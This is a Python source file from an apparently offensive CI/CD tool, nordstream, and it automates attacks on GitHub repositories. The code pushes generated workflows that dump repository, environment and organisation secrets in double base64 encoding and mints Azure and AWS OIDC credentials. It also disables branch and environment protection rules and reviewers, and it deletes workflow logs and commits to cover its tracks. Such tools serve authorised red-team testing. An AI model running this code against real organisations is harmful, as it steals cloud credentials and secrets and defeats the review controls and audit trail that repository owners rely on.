import logging
import base64
import glob
from zipfile import ZipFile
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.yaml.github import WorkflowGenerator
from nordstream.core.github.protections import (
    resetRequiredStatusCheck,
    resetRequiredPullRequestReviews,
    resetRestrictions,
)
from nordstream.core.github.display import *
from nordstream.utils.errors import GitHubError, GitPushError
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess


class GitHubWorkflowRunner:
    _cicd = None
    _taskName = "command"
    _workflowFilename = "init_ZkITM.yaml"
    _fileName = None
    _env = None
    _extractRepo = True
    _extractEnv = True
    _extractOrg = True
    _yaml = None
    _exploitOIDC = False
    _tenantId = None
    _subscriptionId = None
    _clientId = None
    _role = None
    _region = None
    _forceDeploy = False
    _disableProtections = None
    _writeAccessFilter = False
    _branchAlreadyExists = False
    _pushedCommitsCount = 0
    _cleanLogs = True

    def __init__(self, cicd, env):
        self._cicd = cicd
        self._env = env
        self.__createLogDir()

    @property
    def extractRepo(self):
        return self._extractRepo

    @extractRepo.setter
    def extractRepo(self, value):
        self._extractRepo = value

    @property
    def extractEnv(self):
        return self._extractEnv

    @extractEnv.setter
    def extractEnv(self, value):
        self._extractEnv = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def workflowFilename(self):
        return self._workflowFilename

    @workflowFilename.setter
    def workflowFilename(self, value):
        self._workflowFilename = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def exploitOIDC(self):
        return self._exploitOIDC

    @exploitOIDC.setter
    def exploitOIDC(self, value):
        self._exploitOIDC = value

    @property
    def tenantId(self):
        return self._tenantId

    @tenantId.setter
    def tenantId(self, value):
        self._tenantId = value

    @property
    def subscriptionId(self):
        return self._subscriptionId

    @subscriptionId.setter
    def subscriptionId(self, value):
        self._subscriptionId = value

    @property
    def clientId(self):
        return self._clientId

    @clientId.setter
    def clientId(self, value):
        self._clientId = value

    @property
    def role(self):
        return self._role

    @role.setter
    def role(self, value):
        self._role = value

    @property
    def region(self):
        return self._region

    @region.setter
    def region(self, value):
        self._region = value

    @property
    def disableProtections(self):
        return self._disableProtections

    @disableProtections.setter
    def disableProtections(self, value):
        self._disableProtections = value

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def pushedCommitsCount(self):
        return self._pushedCommitsCount

    @pushedCommitsCount.setter
    def pushedCommitsCount(self, value):
        self._pushedCommitsCount = value

    @property
    def forceDeploy(self):
        return self._forceDeploy

    @forceDeploy.setter
    def forceDeploy(self, value):
        self._forceDeploy = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/github"
        makedirs(self._cicd.outputDir, exist_ok=True)

    @staticmethod
    def __createWorkflowDir():
        makedirs(".github/workflows", exist_ok=True)

    def __extractWorkflowOutput(self, repo):
        name = self._fileName.strip(".zip")
        with ZipFile(f"{self._cicd.outputDir}/{repo}/{self._fileName}") as zipOutput:
            zipOutput.extractall(f"{self._cicd.outputDir}/{repo}/{name}")

    def __extractSensitiveInformationFromWorkflowResult(self, repo, informationType="Secrets"):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                # well it's working
                data = output.readlines()[-1].split(" ")[1]

                try:
                    secrets = base64.b64decode(base64.b64decode(data))
                except Exception as e:
                    logger.exception(e)
            logger.success(f"{informationType}:")
            logger.raw(secrets, logging.INFO)

            with open(f"{self._cicd.outputDir}/{repo}/{informationType.lower().replace(' ', '_')}.txt", "ab") as file:
                file.write(secrets)

    def __getWorkflowOutputFileName(self, repo):
        name = self._fileName.strip(".zip")
        filePaths = glob.glob(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        logger.debug(filePaths)
        logger.debug(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        if len(filePaths) > 0:
            filePath = filePaths[0]
            return filePath

        else:
            logger.success(f"Data is accessible here: {self._cicd.outputDir}/{repo}/{name}/")
            return None

    def __displayCustomWorkflowOutput(self, repo):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                logger.success("Workflow output:")
                line = output.readline()
                while line != "":
                    logger.raw(line, logging.INFO)
                    line = output.readline()

    def createYaml(self, repo):
        repo = self._cicd.org + "/" + repo

        if self._env:
            try:
                secrets = self._cicd.listSecretsFromEnv(repo, self._env)
            except GitHubError as e:
                # FIXME: Raise an Exception here
                logger.exception(e)
        else:
            secrets = self._cicd.listSecretsFromRepo(repo)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, self._env)

            logger.success("YAML file: ")
            workflowGenerator.displayYaml()
            workflowGenerator.writeFile(self._workflowFilename)
        else:
            logger.info("No secret found.")

    def __extractSecretsFromRepo(self, repo):
        logger.info(f'Getting secrets from repo: "{repo}"')
        secrets = []

        try:
            if self._extractRepo:
                secrets += self._cicd.listSecretsFromRepo(repo)
            if self._extractOrg:
                secrets += self._cicd.listOrganizationSecretsFromRepo(repo)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "repo", self._env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromSingleEnv(self, repo, env):
        logger.info(f'Getting secrets from environment: "{env}" ({repo})')
        secrets = []

        try:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, env)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, f"env_{env}", env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromAllEnv(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__extractSecretsFromSingleEnv(repo, env)

    def __extractSecretsFromEnv(self, repo):
        if self._env:
            self.__extractSecretsFromSingleEnv(repo, self._env)
        else:
            self.__extractSecretsFromAllEnv(repo)

    def __generateAndLaunchWorkflow(self, repo, workflowGenerator, outputName, env=None):

        policyId = waitTime = reviewers = branchPolicy = envDetails = None

        try:

            # disable env protection before launching the workflow if no '--force' and env is not null
            if not self._forceDeploy and env:

                # check protection and if enabled return the protections
                envDetails = self.__isEnvProtectionsEnabled(repo, env)
                if envDetails and len(envDetails.get("protection_rules")):

                    # if --disable-protection disable the env protections
                    if self._disableProtections:
                        (
                            policyId,
                            waitTime,
                            reviewers,
                            branchPolicy,
                        ) = self.__disableEnvProtections(repo, envDetails)
                    else:
                        raise Exception("Environment protection rule enabled but '--disable-protections' not activated")

            # start the workflow
            workflowId, workflowConclusion = self.__launchWorkflow(repo, workflowGenerator)

            # check workflow status and get result if it's ok
            return self.__postProcessingWorkflow(repo, workflowId, workflowConclusion, outputName)

        except GitPushError as e:
            pass

        except Exception as e:
            logger.error(f"Error: {e}")
            if logger.getEffectiveLevel() == logging.DEBUG:
                logger.exception(e)

        finally:

            # restore protections
            if self._disableProtections and envDetails:
                self.__restoreEnvProtections(repo, env, policyId, waitTime, reviewers, branchPolicy)

    def __launchWorkflow(self, repo, workflowGenerator):
        logger.verbose(f"Launching workflow.")

        workflowGenerator.writeFile(f".github/workflows/{self._workflowFilename}")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
            logger.error("Error when pushing code: Everything up-to-date")
            logger.warning("Your trying to push the same code on an existing branch, modify the yaml file to push it.")
            raise GitPushError

        elif pushOutput.returncode != 0:
            logger.error("Error when pushing code:")
            logger.raw(pushOutput.communicate()[1], logging.INFO)
            raise GitPushError

        else:
            self._pushedCommitsCount += 1

            logger.raw(pushOutput.communicate()[1])
            workflowId, workflowConclusion = self._cicd.waitWorkflow(repo, self._workflowFilename)

            return workflowId, workflowConclusion

    def __postProcessingWorkflow(self, repo, workflowId, workflowConclusion, outputName):

        if workflowId and workflowConclusion == "success":
            logger.success("Workflow has successfully terminated.")
            self._fileName = self._cicd.downloadWorkflowOutput(
                repo,
                f"{outputName.replace('/','_').replace(' ', '_')}",
                workflowId,
            )
            self.__extractWorkflowOutput(repo)
            return True
        elif workflowId and workflowConclusion == "failure":
            logger.error("Workflow failure:")
            for reason in self._cicd.getFailureReason(repo, workflowId):
                logger.error(f"{reason}")
            return False
        else:
            return False

    def listGitHubRepos(self):
        logger.info("Listing all repos:")
        for r in self._cicd.repos:
            logger.raw(f"- {r}\n", level=logging.INFO)

    def listGitHubSecrets(self):
        logger.info("Listing secrets:")
        for repo in self._cicd.repos:
            try:
                logger.info(f'"{repo}" secrets')

                if self._extractRepo:
                    self.__displayRepoSecrets(repo)

                if self._extractEnv:
                    self.__displayEnvSecrets(repo)

                if self._extractOrg:
                    self.__displayOrgSecrets(repo)

            except Exception:
                logger.error("Need write acccess on the repo.")

    def __displayRepoSecrets(self, repo):
        secrets = self._cicd.listSecretsFromRepo(repo)
        displayRepoSecrets(secrets)

    def __displayEnvSecrets(self, repo):
        envs = self._cicd.listEnvFromrepo(repo)
        for env in envs:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
            displayEnvSecrets(env, secrets)

    def __displayOrgSecrets(self, repo):
        secrets = self._cicd.listOrganizationSecretsFromRepo(repo)
        displayOrgSecrets(secrets)

    def getRepos(self, repo):
        if repo:
            if exists(repo):
                with open(repo, "r") as file:
                    for repo in file:
                        self._cicd.addRepo(repo.strip())

            else:
                self._cicd.addRepo(repo)

        else:
            self._cicd.listRepos()

        if self._writeAccessFilter:
            self._cicd.filterWriteRepos()

        if len(self._cicd.repos) == 0:
            if self._writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for repo in self._cicd.repos:
            self._cicd.cleanAllLogs(repo, self._workflowFilename)

    def manualCleanBranchPolicy(self):
        logger.info("Deleting deployment branch policy")
        for repo in self._cicd.repos:
            self._cicd.deleteDeploymentBranchPolicyForAllEnv(repo)

    def __runCustomWorkflow(self, repo):
        logger.info(f"Running custom workflow: {self._yaml}")

        workflowGenerator = WorkflowGenerator()
        workflowGenerator.loadFile(self._yaml)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "custom", self._env):
            self.__displayCustomWorkflowOutput(repo)

        logger.empty_line()

    def __runOIDCTokenGenerationWorfklow(self, repo):

        workflowGenerator = WorkflowGenerator()
        if self._tenantId is not None and self._clientId is not None:
            logger.info("Running OIDC Azure access tokens generation workflow")
            informationType = "OIDC access tokens"
            workflowGenerator.generateWorkflowForOIDCAzureTokenGeneration(
                self._tenantId, self._subscriptionId, self._clientId, self._env
            )
        else:
            logger.info("Running OIDC AWS credentials generation workflow")
            informationType = "OIDC credentials"
            workflowGenerator.generateWorkflowForOIDCAWSTokenGeneration(self._role, self._region, self._env)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "oidc", self._env):
            self.__extractSensitiveInformationFromWorkflowResult(repo, informationType=informationType)

        logger.empty_line()

    def __runSecretsExtractionWorkflow(self, repo):
        if self._extractRepo or self._extractOrg:
            self.__extractSecretsFromRepo(repo)

        if self._extractEnv:
            self.__extractSecretsFromEnv(repo)

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, repo):

        if self._pushedCommitsCount > 0:

            if self._cleanLogs:
                logger.info("Cleaning logs.")
                self._cicd.cleanAllLogs(repo, self._workflowFilename)

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self.__deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def start(self):

        for repo in self._cicd.repos:
            logger.success(f'"{repo}"')

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:

                # check and disable branch protection rules
                protections = None
                if not self._forceDeploy:
                    protections = self.__checkAndDisableBranchProtectionRules(repo)

                self.__createWorkflowDir()
                self.__dispatchWorkflow(repo)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:

                self.__clean(repo)

                # if we are working with the default nord-stream branch we managed to
                # delete the branch during the previous clean operation

                if self._cicd.branchName != self._cicd.defaultBranchName:
                    if protections:
                        self.__resetBranchProtectionRules(repo, protections)

                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __dispatchWorkflow(self, repo):
        if self._yaml:
            self.__runCustomWorkflow(repo)
        elif self._exploitOIDC:
            self.__runOIDCTokenGenerationWorfklow(repo)
        else:
            self.__runSecretsExtractionWorkflow(repo)

    def __checkAllEnvSecurity(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__checkSingleEnvSecurity(repo, env)

    def __checkSingleEnvSecurity(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        displayEnvSecurity(envDetails)

    def checkBranchProtections(self):
        for repo in self._cicd.repos:
            logger.info(f'Checking security: "{repo}"')
            # TODO: check branch wide protection
            # For now, it's not available in the REST API. It could still be performed using the GraphQL API.
            # https://github.com/github/safe-settings/issues/311
            protectionEnabled = False

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

                if protectionEnabled:
                    if protection:
                        displayBranchProtectionRules(protection)
                    else:
                        logger.info(
                            "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                        )

                self.__checkAllEnvSecurity(repo)

            except Exception:
                pass
            finally:
                self.__clean(repo)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

    def _checkBranchProtectionRules(self, repo):
        protectionEnabled = False

        try:
            protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
        except GitHubError:
            pass

        if not protectionEnabled:
            Git.gitCreateEmptyFile("test_push.md")
            pushOutput = Git.gitPush(self._cicd.branchName)
            pushOutput.wait()

            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
                return True
            else:
                self._pushedCommitsCount += 1

            try:
                protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
            except GitHubError:
                pass
        return protectionEnabled

    def __checkAndDisableBranchProtectionRules(self, repo):

        protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

        if protectionEnabled:

            if protection:
                displayBranchProtectionRules(protection)
            else:
                logger.info(
                    "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )

            if protection and self.disableProtections:
                if self._cicd.branchName != self._cicd.defaultBranchName:
                    logger.warning("Removing branch protection, wait until it's restored.")
                else:
                    # no need to restore branch protection if we are working with the default
                    # nord-stream branch
                    logger.warning("Removing branch protection.")

                self._cicd.disableBranchProtectionRules(repo)
                return protection

            elif self.disableProtections:
                # if we can't list protection this means that we don't have enough privileges
                raise Exception(
                    "Not enough privileges to disable protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )
            else:
                raise Exception("branch protection rule enabled but '--disable-protections' not activated")

        return None

    def __checkAndGetBranchProtectionRules(self, repo):
        protectionEnabled = self._checkBranchProtectionRules(repo)

        if protectionEnabled:
            logger.info(f'Found branch protection rule on "{self._cicd.branchName}" branch')
            try:
                protection = self._cicd.getBranchesProtectionRules(repo)
                return True, protection

            except GitHubError:
                return True, None
        else:
            logger.info(f'No branch protection rule found on "{self._cicd.branchName}" branch')
        return False, None

    def __isEnvProtectionsEnabled(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        protectionRules = envDetails.get("protection_rules")

        if len(protectionRules) > 0:
            displayEnvSecurity(envDetails)
            return envDetails

        else:
            logger.verbose("No environment protection rule found")
            return False

        return policyId, waitTime, reviewers, branchPolicy

    def __disableEnvProtections(self, repo, envDetails):
        protectionRules = envDetails.get("protection_rules")
        branchPolicy = envDetails.get("deployment_branch_policy")
        waitTime = 0
        reviewers = []
        policyId = None
        env = envDetails.get("name")

        try:
            logger.warning("Modifying env protection, wait until it's restored.")
            if branchPolicy and branchPolicy.get("custom_branch_policies", False):
                policyId = self._cicd.createDeploymentBranchPolicy(repo, env)

            for protection in protectionRules:
                if protection.get("type") == "required_reviewers":
                    for reviewer in protection.get("reviewers"):
                        reviewers.append(
                            {
                                "type": reviewer.get("type"),
                                "id": reviewer.get("reviewer").get("id"),
                            }
                        )
                if protection.get("type") == "wait_timer":
                    waitTime = protection.get("wait_timer")

            self._cicd.modifyEnvProtectionRules(repo, env, 0, [], branchPolicy)
        except GitHubError:
            raise Exception("Environment protection rule enabled but not enough privileges to disable it.")

        return policyId, waitTime, reviewers, branchPolicy

    def __restoreEnvProtections(self, repo, env, policyId, waitTime, reviewers, branchPolicy):
        logger.warning("Restoring env protections.")
        if policyId is not None:
            self._cicd.deleteDeploymentBranchPolicy(repo, env)
        self._cicd.modifyEnvProtectionRules(repo, env, waitTime, reviewers, branchPolicy)

    def describeToken(self):
        response = self._cicd.getUser()
        headers = response.headers
        response = response.json()

        logger.info("Token information:")

        login = response.get("login")
        if login != None:
            logger.raw(f"\t- Login: {login}\n", logging.INFO)

        isAdmin = response.get("site_admin")
        if isAdmin != None:
            logger.raw(f"\t- IsAdmin: {isAdmin}\n", logging.INFO)

        email = response.get("email")
        if email != None:
            logger.raw(f"\t- Email: {email}\n", logging.INFO)

        id = response.get("id")
        if id != None:
            logger.raw(f"\t- Id: {id}\n", logging.INFO)

        bio = response.get("bio")
        if bio != None:
            logger.raw(f"\t- Bio: {bio}\n", logging.INFO)

        company = response.get("company")
        if company != None:
            logger.raw(f"\t- Company: {company}\n", logging.INFO)

        tokenScopes = headers.get("x-oauth-scopes")
        if tokenScopes != None:
            scopes = tokenScopes.split(", ")
            if len(scopes) != 0:
                logger.raw(f"\t- Token scopes:\n", logging.INFO)
                for scope in scopes:
                    logger.raw(f"\t    - {scope}\n", logging.INFO)

    def __resetBranchProtectionRules(self, repo, protections):

        logger.warning("Restoring branch protection.")

        data = {}

        data["required_status_checks"] = resetRequiredStatusCheck(protections)
        data["required_pull_request_reviews"] = resetRequiredPullRequestReviews(protections)
        data["restrictions"] = resetRestrictions(protections)

        data["enforce_admins"] = protections.get("enforce_admins").get("enabled")
        data["allow_deletions"] = protections.get("allow_deletions").get("enabled")
        data["allow_force_pushes"] = protections.get("allow_force_pushes").get("enabled")
        data["block_creations"] = protections.get("block_creations").get("enabled")

        res = self._cicd.updateBranchesProtectionRules(repo, data)

        msg = res.get("message")
        if msg:
            logger.error(f"Fail to restore protection: {msg}")
            logger.info(f"Raw protections: {protections}")
